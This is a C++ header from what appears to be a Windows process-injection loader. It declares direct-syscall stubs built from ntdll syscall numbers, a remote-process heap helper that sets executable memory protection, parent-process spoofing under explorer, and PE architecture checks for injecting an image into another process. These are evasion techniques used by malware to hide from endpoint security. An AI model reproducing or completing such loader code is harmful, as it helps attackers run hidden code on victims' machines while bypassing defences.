#pragma once
#include <windows.h>
#include <tlhelp32.h>
#include <vector>
#include <string>
#include <cstdarg>

//  helpers
void EnsureConsole();
void Log(const char* fmt, ...);

// direct syscall bootstrap
bool  InitSyscalls();            
void* BuildSysStub(DWORD id);     

// wrapper к Nt
template <typename T> inline T GetNt(const char* name)
{
    static T fn = nullptr;
    if (!fn)
    {
        HMODULE nt = GetModuleHandleW(L"ntdll.dll");
        BYTE*   exp = (BYTE*)GetProcAddress(nt, name);

#ifdef _WIN64                       //  x86‑port
        DWORD id = *(DWORD*)(exp + 4);          // mov eax, id
#else
        DWORD id = *(DWORD*)(exp + 1);          // 0xB8 <id>
#endif
        fn = reinterpret_cast<T>(BuildSysStub(id));
    }
    return fn;
}

//  RemoteHeap
struct RemoteHeap {
    HANDLE hProc;
    std::vector<std::pair<PVOID,SIZE_T>> blocks;

    explicit RemoteHeap(HANDLE hp) : hProc(hp) {}
    PVOID alloc(SIZE_T bytes);
    void  protectRX(PVOID base, SIZE_T bytes);
    void  freeAll();
};

// PPID spoof
bool  BuildSiWithExplorerParent(STARTUPINFOEXW& si, HANDLE& hParent);
void  FreeSiAttributes(STARTUPINFOEXW& si, HANDLE hParent);

// Arch check
bool  CheckArchMatch(HANDLE target, PIMAGE_NT_HEADERS nt, std::string& err);

// FAIL macro
#define FAIL(step) \
    do{ DWORD _e=GetLastError(); \
        error_str = step; error_str += ": " + std::to_string(_e); \
        Log("[!] %s", error_str.c_str()); \
        rh.freeAll(); NtTerminateProcess(hProc,1); return _e; }while(0)
